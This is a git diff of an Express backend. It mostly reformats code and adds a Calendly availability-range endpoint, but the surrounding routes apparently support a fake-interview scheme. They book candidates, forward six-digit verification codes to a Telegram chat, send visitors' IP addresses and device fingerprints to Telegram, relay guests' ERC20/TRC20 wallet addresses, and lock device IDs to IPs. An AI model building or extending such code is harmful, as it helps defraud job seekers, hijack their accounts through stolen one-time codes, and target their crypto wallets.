@@ -6,10 +6,12 @@ import { closeDatabase, initializeDatabase, pool } from './db.js';
 const app = express();
 const port = Number(process.env.PORT || 3001);
 const trustProxy = process.env.TRUST_PROXY === 'true';
-const CALENDLY_API_BASE_URL = process.env.CALENDLY_API_BASE_URL || 'https://api.calendly.com';
+const CALENDLY_API_BASE_URL =
+  process.env.CALENDLY_API_BASE_URL || 'https://api.calendly.com';
 const CALENDLY_API_TOKEN = process.env.CALENDLY_API_TOKEN || '';
 const CALENDLY_EVENT_TYPE_URI = process.env.CALENDLY_EVENT_TYPE_URI || '';
 const CALENDLY_SLOT_MINUTES = Number(process.env.CALENDLY_SLOT_MINUTES || 30);
+const EASTERN_TIME_ZONE = 'America/New_York';
 const GOOGLE_SHEET_WEBHOOK_URL = process.env.GOOGLE_SHEET_WEBHOOK_URL || '';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
@@ -26,9 +28,14 @@ if (trustProxy) {
   app.set('trust proxy', true);
 }
 
-app.use(cors({
-  origin: process.env.CORS_ORIGIN?.split(',').map((origin) => origin.trim()).filter(Boolean) || true,
-}));
+app.use(
+  cors({
+    origin:
+      process.env.CORS_ORIGIN?.split(',')
+        .map((origin) => origin.trim())
+        .filter(Boolean) || true,
+  })
+);
 app.use(express.json());
 
 function getClientIp(req) {
@@ -66,7 +73,9 @@ function isGoogleSheetConfigured() {
 }
 
 function isValidEmail(value) {
-  return typeof value === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
+  return (
+    typeof value === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim())
+  );
 }
 
 function parseJsonSafely(text) {
@@ -116,7 +125,10 @@ async function calendlyRequest(path, options = {}) {
     return {
       ok: false,
       status: response.status,
-      message: extractCalendlyErrorMessage(parsed, `Calendly API request failed (${response.status})`),
+      message: extractCalendlyErrorMessage(
+        parsed,
+        `Calendly API request failed (${response.status})`
+      ),
       data: parsed,
     };
   }
@@ -130,7 +142,9 @@ async function calendlyRequest(path, options = {}) {
 
 function buildAvailabilityWindow(startTimeIso) {
   const startDate = new Date(startTimeIso);
-  const endDate = new Date(startDate.getTime() + CALENDLY_SLOT_MINUTES * 60 * 1000);
+  const endDate = new Date(
+    startDate.getTime() + CALENDLY_SLOT_MINUTES * 60 * 1000
+  );
   return {
     startTime: startDate.toISOString(),
     endTime: endDate.toISOString(),
@@ -146,6 +160,83 @@ async function fetchCalendlyAvailability(startTimeIso) {
   });
 
   return calendlyRequest(`/event_type_available_times?${params.toString()}`);
+}
+
+async function fetchCalendlyAvailabilityWindow(startTimeIso, endTimeIso) {
+  const params = new URLSearchParams({
+    event_type: CALENDLY_EVENT_TYPE_URI,
+    start_time: startTimeIso,
+    end_time: endTimeIso,
+  });
+
+  return calendlyRequest(`/event_type_available_times?${params.toString()}`);
+}
+
+function getEasternDateKeyAndTime(iso) {
+  try {
+    const date = new Date(iso);
+    const parts = new Intl.DateTimeFormat('en-CA', {
+      timeZone: EASTERN_TIME_ZONE,
+      year: 'numeric',
+      month: '2-digit',
+      day: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit',
+      hour12: false,
+    }).formatToParts(date);
+
+    const values = Object.fromEntries(
+      parts.filter((p) => p.type !== 'literal').map((p) => [p.type, p.value])
+    );
+    const dateKey = `${values.year}-${values.month}-${values.day}`;
+    const time = `${values.hour}:${values.minute}`;
+    const weekday = new Date(
+      Date.UTC(
+        Number(values.year),
+        Number(values.month) - 1,
+        Number(values.day)
+      )
+    ).getUTCDay();
+    return { dateKey, time, weekday };
+  } catch (e) {
+    return null;
+  }
+}
+
+async function fetchAvailabilityRange(days = 14) {
+  const resultsMap = new Map();
+  const base = Date.now();
+
+  for (let offset = 0; offset < days; offset++) {
+    const dayStart = new Date(base + offset * 24 * 60 * 60 * 1000);
+    const dayEnd = new Date(base + (offset + 1) * 24 * 60 * 60 * 1000);
+    const availabilityRes = await fetchCalendlyAvailabilityWindow(
+      dayStart.toISOString(),
+      dayEnd.toISOString()
+    );
+    if (!availabilityRes.ok) continue;
+    const collection = Array.isArray(availabilityRes.data?.collection)
+      ? availabilityRes.data.collection
+      : [];
+    for (const item of collection) {
+      const startTime =
+        typeof item?.start_time === 'string' ? item.start_time : '';
+      if (!startTime) continue;
+      const info = getEasternDateKeyAndTime(startTime);
+      if (!info) continue;
+      // Skip weekends
+      if (info.weekday === 0 || info.weekday === 6) continue;
+      if (!resultsMap.has(info.dateKey))
+        resultsMap.set(info.dateKey, new Set());
+      resultsMap.get(info.dateKey).add(info.time);
+    }
+  }
+
+  const out = Array.from(resultsMap.entries()).map(([dateKey, timesSet]) => ({
+    dateKey,
+    times: Array.from(timesSet).sort(),
+  }));
+  return out.sort((a, b) => a.dateKey.localeCompare(b.dateKey));
 }
 
 async function sendTelegramMessage(text) {
@@ -169,7 +260,9 @@ async function sendTelegramMessage(text) {
     return {
       ok: false,
       status: response.status,
-      message: parsed?.description || `Telegram API request failed (${response.status})`,
+      message:
+        parsed?.description ||
+        `Telegram API request failed (${response.status})`,
       data: parsed,
     };
   }
@@ -197,7 +290,10 @@ async function postGoogleSheetBookingRow(rowPayload) {
     return {
       ok: false,
       status: response.status,
-      message: parsed?.status || parsed?.message || `Google Sheet webhook request failed (${response.status})`,
+      message:
+        parsed?.status ||
+        parsed?.message ||
+        `Google Sheet webhook request failed (${response.status})`,
       data: parsed,
     };
   }
@@ -217,17 +313,25 @@ app.get('/api/calendly/availability', async (req, res) => {
     });
   }
 
-  const startTime = typeof req.query.startTime === 'string' ? req.query.startTime : '';
+  const startTime =
+    typeof req.query.startTime === 'string' ? req.query.startTime : '';
   if (!startTime) {
-    return res.status(400).json({ result: false, status: 'startTime is required.' });
+    return res
+      .status(400)
+      .json({ result: false, status: 'startTime is required.' });
   }
 
   const parsedStart = new Date(startTime);
   if (Number.isNaN(parsedStart.getTime())) {
-    return res.status(400).json({ result: false, status: 'startTime must be a valid ISO timestamp.' });
+    return res.status(400).json({
+      result: false,
+      status: 'startTime must be a valid ISO timestamp.',
+    });
   }
 
-  const availabilityRes = await fetchCalendlyAvailability(parsedStart.toISOString());
+  const availabilityRes = await fetchCalendlyAvailability(
+    parsedStart.toISOString()
+  );
   if (!availabilityRes.ok) {
     return res.status(availabilityRes.status || 502).json({
       result: false,
@@ -236,8 +340,52 @@ app.get('/api/calendly/availability', async (req, res) => {
     });
   }
 
-  const collection = Array.isArray(availabilityRes.data?.collection) ? availabilityRes.data.collection : [];
-  return res.json({ result: true, status: 'availability fetched', data: collection });
+  const collection = Array.isArray(availabilityRes.data?.collection)
+    ? availabilityRes.data.collection
+    : [];
+  return res.json({
+    result: true,
+    status: 'availability fetched',
+    data: collection,
+  });
+});
+
+app.get('/api/calendly/availability-range', async (req, res) => {
+  if (!isCalendlyConfigured()) {
+    return res
+      .status(503)
+      .json({
+        result: false,
+        status: 'Calendly API is not configured on backend.',
+      });
+  }
+
+  const days = Number(req.query.days || 14);
+  if (!Number.isInteger(days) || days <= 0 || days > 60) {
+    return res
+      .status(400)
+      .json({
+        result: false,
+        status: 'days must be an integer between 1 and 60.',
+      });
+  }
+
+  try {
+    const availability = await fetchAvailabilityRange(days);
+    return res.json({
+      result: true,
+      status: 'availability range fetched',
+      data: availability,
+    });
+  } catch (err) {
+    console.error('Failed to fetch availability range', err);
+    return res
+      .status(502)
+      .json({
+        result: false,
+        status: 'Failed to fetch availability from Calendly.',
+      });
+  }
 });
 
 app.post('/api/calendly/book', async (req, res) => {
@@ -248,25 +396,83 @@ app.post('/api/calendly/book', async (req, res) => {
     });
   }
 
-  const email = typeof req.body?.email === 'string' ? req.body.email.trim() : '';
-  const timeslot = typeof req.body?.timeslot === 'string' ? req.body.timeslot : '';
-  const name = typeof req.body?.name === 'string' && req.body.name.trim() ? req.body.name.trim() : email.split('@')[0] || 'Candidate';
-  const timezone = typeof req.body?.timezone === 'string' && req.body.timezone.trim() ? req.body.timezone.trim() : 'America/New_York';
-  const meetingLink = typeof req.body?.meetingLink === 'string' ? req.body.meetingLink.trim() : '';
-  const inviteCode = typeof req.body?.inviteCode === 'string' ? req.body.inviteCode.trim() : '';
+  const email =
+    typeof req.body?.email === 'string' ? req.body.email.trim() : '';
+  const timeslot =
+    typeof req.body?.timeslot === 'string' ? req.body.timeslot : '';
+  const name =
+    typeof req.body?.name === 'string' && req.body.name.trim()
+      ? req.body.name.trim()
+      : email.split('@')[0] || 'Candidate';
+  const timezone =
+    typeof req.body?.timezone === 'string' && req.body.timezone.trim()
+      ? req.body.timezone.trim()
+      : 'America/New_York';
+  const meetingLink =
+    typeof req.body?.meetingLink === 'string'
+      ? req.body.meetingLink.trim()
+      : '';
+  const inviteCode =
+    typeof req.body?.inviteCode === 'string' ? req.body.inviteCode.trim() : '';
   const note = typeof req.body?.note === 'string' ? req.body.note.trim() : '';
 
   if (!isValidEmail(email)) {
-    return res.status(400).json({ result: false, status: 'A valid email is required.' });
+    return res
+      .status(400)
+      .json({ result: false, status: 'A valid email is required.' });
   }
 
-  const parsedTimeslot = new Date(timeslot);
-  if (Number.isNaN(parsedTimeslot.getTime())) {
-    return res.status(400).json({ result: false, status: 'timeslot must be a valid ISO timestamp.' });
+  // Normalize timeslot input: accept ISO strings or epoch (seconds or milliseconds)
+  let parsedTimeslot = null;
+  try {
+    if (/^\d+$/.test(timeslot)) {
+      // Numeric timestamp - determine seconds vs milliseconds
+      const asNum = Number(timeslot);
+      if (String(asNum).length <= 10) {
+        // seconds -> convert to ms
+        parsedTimeslot = new Date(asNum * 1000);
+      } else {
+        // assume milliseconds
+        parsedTimeslot = new Date(asNum);
+      }
+    } else {
+      parsedTimeslot = new Date(timeslot);
+    }
+  } catch (e) {
+    parsedTimeslot = null;
+  }
+
+  if (!parsedTimeslot || Number.isNaN(parsedTimeslot.getTime())) {
+    console.warn('Invalid timeslot received from client:', {
+      timeslot,
+      ip: normalizeIpAddress(getClientIp(req)),
+    });
+    return res.status(400).json({
+      result: false,
+      status:
+        'timeslot must be a valid ISO timestamp or epoch seconds/milliseconds.',
+    });
+  }
+
+  const tsYear = parsedTimeslot.getUTCFullYear();
+  if (tsYear < 2020 || tsYear > 2035) {
+    console.warn('Suspicious timeslot year from client:', {
+      timeslot,
+      parsed: parsedTimeslot.toISOString(),
+      year: tsYear,
+      ip: normalizeIpAddress(getClientIp(req)),
+    });
+    return res.status(400).json({
+      result: false,
+      status:
+        'timeslot appears invalid (year out of expected range). Please select a valid date.',
+    });
   }
 
   // Validate the selected slot against Calendly before creating invitee.
-  const availabilityRes = await fetchCalendlyAvailability(parsedTimeslot.toISOString());
+  const availabilityRes = await fetchCalendlyAvailability(
+    parsedTimeslot.toISOString()
+  );
   if (!availabilityRes.ok) {
     return res.status(availabilityRes.status || 502).json({
       result: false,
@@ -275,11 +481,14 @@ app.post('/api/calendly/book', async (req, res) => {
     });
   }
 
-  const availabilityCollection = Array.isArray(availabilityRes.data?.collection) ? availabilityRes.data.collection : [];
+  const availabilityCollection = Array.isArray(availabilityRes.data?.collection)
+    ? availabilityRes.data.collection
+    : [];
   const selectedIso = parsedTimeslot.toISOString();
   const selectedTs = parsedTimeslot.getTime();
   const slotExists = availabilityCollection.some((item) => {
-    const startTime = typeof item?.start_time === 'string' ? item.start_time : '';
+    const startTime =
+      typeof item?.start_time === 'string' ? item.start_time : '';
     if (!startTime) return false;
     const slotTs = new Date(startTime).getTime();
     return Number.isFinite(slotTs) && slotTs === selectedTs;
@@ -288,18 +497,23 @@ app.post('/api/calendly/book', async (req, res) => {
   if (!slotExists) {
     return res.status(409).json({
       result: false,
-      status: 'The selected timeslot is no longer available. Please choose another one.',
+      status:
+        'The selected timeslot is no longer available. Please choose another one.',
     });
   }
 
   const selectedSlot = availabilityCollection.find((item) => {
-    const startTime = typeof item?.start_time === 'string' ? item.start_time : '';
+    const startTime =
+      typeof item?.start_time === 'string' ? item.start_time : '';
     if (!startTime) return false;
     const slotTs = new Date(startTime).getTime();
     return Number.isFinite(slotTs) && slotTs === selectedTs;
   });
 
-  const schedulingUrlRaw = typeof selectedSlot?.scheduling_url === 'string' ? selectedSlot.scheduling_url : '';
+  const schedulingUrlRaw =
+    typeof selectedSlot?.scheduling_url === 'string'
+      ? selectedSlot.scheduling_url
+      : '';
   if (!schedulingUrlRaw) {
     return res.status(500).json({
       result: false,
@@ -334,23 +548,43 @@ app.post('/api/google-sheet/booking-log', async (req, res) => {
     });
   }
 
-  const linkedin = typeof req.body?.linkedin === 'string' ? req.body.linkedin.trim() : '';
-  const email = typeof req.body?.email === 'string' ? req.body.email.trim() : '';
+  const linkedin =
+    typeof req.body?.linkedin === 'string' ? req.body.linkedin.trim() : '';
+  const email =
+    typeof req.body?.email === 'string' ? req.body.email.trim() : '';
   const main = typeof req.body?.main === 'string' ? req.body.main.trim() : '';
   const id = typeof req.body?.id === 'string' ? req.body.id.trim() : '';
   const date = typeof req.body?.date === 'string' ? req.body.date.trim() : '';
   const time = typeof req.body?.time === 'string' ? req.body.time.trim() : '';
   const state = '';
-  const country = typeof req.body?.country === 'string' ? req.body.country.trim() : '';
-  const meetingLink = typeof req.body?.meetingLink === 'string' ? req.body.meetingLink.trim() : '';
+  const country =
+    typeof req.body?.country === 'string' ? req.body.country.trim() : '';
+  const meetingLink =
+    typeof req.body?.meetingLink === 'string'
+      ? req.body.meetingLink.trim()
+      : '';
   const note = typeof req.body?.note === 'string' ? req.body.note.trim() : '';
-  const phoneNumber = typeof req.body?.phoneNumber === 'string' ? req.body.phoneNumber.trim() : '';
-  const location = typeof req.body?.location === 'string' ? req.body.location.trim() : '';
+  const phoneNumber =
+    typeof req.body?.phoneNumber === 'string'
+      ? req.body.phoneNumber.trim()
+      : '';
+  const location =
+    typeof req.body?.location === 'string' ? req.body.location.trim() : '';
 
-  if (!linkedin || !email || !main || !id || !date || !time || !country || !meetingLink) {
+  if (
+    !linkedin ||
+    !email ||
+    !main ||
+    !id ||
+    !date ||
+    !time ||
+    !country ||
+    !meetingLink
+  ) {
     return res.status(400).json({
       result: false,
-      status: 'linkedin, email, main, id, date, time, country, and meetingLink are required.',
+      status:
+        'linkedin, email, main, id, date, time, country, and meetingLink are required.',
     });
   }
 
@@ -399,13 +633,18 @@ app.post('/api/phone-verification/notify', async (req, res) => {
   }
 
   const code = typeof req.body?.code === 'string' ? req.body.code.trim() : '';
-  const message = typeof req.body?.message === 'string' ? req.body.message.trim() : '';
-  const companyName = typeof req.body?.companyName === 'string' ? req.body.companyName.trim() : 'Unknown Company';
+  const message =
+    typeof req.body?.message === 'string' ? req.body.message.trim() : '';
+  const companyName =
+    typeof req.body?.companyName === 'string'
+      ? req.body.companyName.trim()
+      : 'Unknown Company';
 
   if (!/^\d{6}$/.test(code) && !message) {
     return res.status(400).json({
       result: false,
-      status: 'code must be a 6-digit numeric value or message must be provided.',
+      status:
+        'code must be a 6-digit numeric value or message must be provided.',
     });
   }
 
@@ -437,12 +676,16 @@ app.post('/api/isrun/notify', async (req, res) => {
     });
   }
 
-  const name = typeof req.body?.name === 'string' && req.body.name.trim()
-    ? req.body.name.trim()
-    : 'Unknown';
-  const data = req.body?.data && typeof req.body.data === 'object' && !Array.isArray(req.body.data)
-    ? req.body.data
-    : null;
+  const name =
+    typeof req.body?.name === 'string' && req.body.name.trim()
+      ? req.body.name.trim()
+      : 'Unknown';
+  const data =
+    req.body?.data &&
+    typeof req.body.data === 'object' &&
+    !Array.isArray(req.body.data)
+      ? req.body.data
+      : null;
 
   if (!data) {
     return res.status(400).json({
@@ -458,27 +701,27 @@ app.post('/api/isrun/notify', async (req, res) => {
     'Screen Resolution',
     'Timezone',
   ]);
-  
+
   // Transform device data into readable line-by-line format
   const formatDeviceData = (deviceObj) => {
     if (!deviceObj || typeof deviceObj !== 'object') return '';
-    
+
     return Object.entries(deviceObj)
       .filter(([key]) => allowedDeviceFields.has(key))
       .map(([key, value]) => {
         // Use original key capitalization as-is
         const formattedKey = key;
-        
+
         // Format value
-        const formattedValue = Array.isArray(value) 
+        const formattedValue = Array.isArray(value)
           ? value.join(', ')
           : String(value).trim();
-        
+
         return `${formattedKey}: ${formattedValue}`;
       })
       .join('\n');
   };
-  
+
   const deviceDataLines = formatDeviceData(data);
   const telegramMessage = `IP: ${ipAddress}\nName: ${name}\n${deviceDataLines}`;
 
@@ -506,16 +749,27 @@ app.post('/api/address/notify', async (req, res) => {
     });
   }
 
-  const erc20 = typeof req.body?.erc20 === 'string' ? req.body.erc20.trim() : '';
-  const trc20 = typeof req.body?.trc20 === 'string' ? req.body.trc20.trim() : '';
-  const guestName = typeof req.body?.guestName === 'string' && req.body.guestName.trim() ? req.body.guestName.trim() : 'Unknown';
-  const companyName = typeof req.body?.companyName === 'string' && req.body.companyName.trim() ? req.body.companyName.trim() : 'Unknown Company';
+  const erc20 =
+    typeof req.body?.erc20 === 'string' ? req.body.erc20.trim() : '';
+  const trc20 =
+    typeof req.body?.trc20 === 'string' ? req.body.trc20.trim() : '';
+  const guestName =
+    typeof req.body?.guestName === 'string' && req.body.guestName.trim()
+      ? req.body.guestName.trim()
+      : 'Unknown';
+  const companyName =
+    typeof req.body?.companyName === 'string' && req.body.companyName.trim()
+      ? req.body.companyName.trim()
+      : 'Unknown Company';
 
   const isValidErc = /^0x[a-fA-F0-9]{40}$/.test(erc20);
   const isValidTrc = /^T[a-zA-Z0-9]{33}$/.test(trc20);
 
   if (!isValidErc || !isValidTrc) {
-    return res.status(400).json({ result: false, status: 'Invalid ERC20 or TRC20 address format.' });
+    return res.status(400).json({
+      result: false,
+      status: 'Invalid ERC20 or TRC20 address format.',
+    });
   }
 
   const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';
@@ -532,7 +786,9 @@ app.post('/api/address/notify', async (req, res) => {
     });
   }
 
-  return res.status(200).json({ result: true, status: 'address notification sent' });
+  return res
+    .status(200)
+    .json({ result: true, status: 'address notification sent' });
 });
 
 app.get('/health', async (_req, res) => {
@@ -546,7 +802,11 @@ app.get('/health', async (_req, res) => {
 
 app.get(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
   const deviceID = normalizeDeviceId(req.query.deviceID);
-  const ipAddress = normalizeIpAddress(typeof req.query.ipAddress === 'string' ? req.query.ipAddress : getClientIp(req));
+  const ipAddress = normalizeIpAddress(
+    typeof req.query.ipAddress === 'string'
+      ? req.query.ipAddress
+      : getClientIp(req)
+  );
 
   if (!deviceID && !ipAddress) {
     return res.status(400).json({
@@ -568,7 +828,9 @@ app.get(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
 
     const row = result.rows[0];
     if (!row) {
-      return res.status(404).json({ result: false, status: 'mapping not found' });
+      return res
+        .status(404)
+        .json({ result: false, status: 'mapping not found' });
     }
 
     return res.json({
@@ -582,7 +844,9 @@ app.get(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
       },
     });
   } catch (error) {
-    return res.status(500).json({ result: false, status: 'failed to fetch mapping' });
+    return res
+      .status(500)
+      .json({ result: false, status: 'failed to fetch mapping' });
   }
 });
 
@@ -591,11 +855,15 @@ app.post(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
   const ipAddress = normalizeIpAddress(req.body?.ipAddress || getClientIp(req));
 
   if (!deviceID) {
-    return res.status(400).json({ result: false, status: 'deviceID is required' });
+    return res
+      .status(400)
+      .json({ result: false, status: 'deviceID is required' });
   }
 
   if (!ipAddress) {
-    return res.status(400).json({ result: false, status: 'ipAddress could not be determined' });
+    return res
+      .status(400)
+      .json({ result: false, status: 'ipAddress could not be determined' });
   }
 
   const client = await pool.connect();
@@ -698,7 +966,9 @@ app.post(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
     }
 
     await client.query('ROLLBACK');
-    return res.status(500).json({ result: false, status: 'failed to save mapping' });
+    return res
+      .status(500)
+      .json({ result: false, status: 'failed to save mapping' });
   } finally {
     client.release();
   }
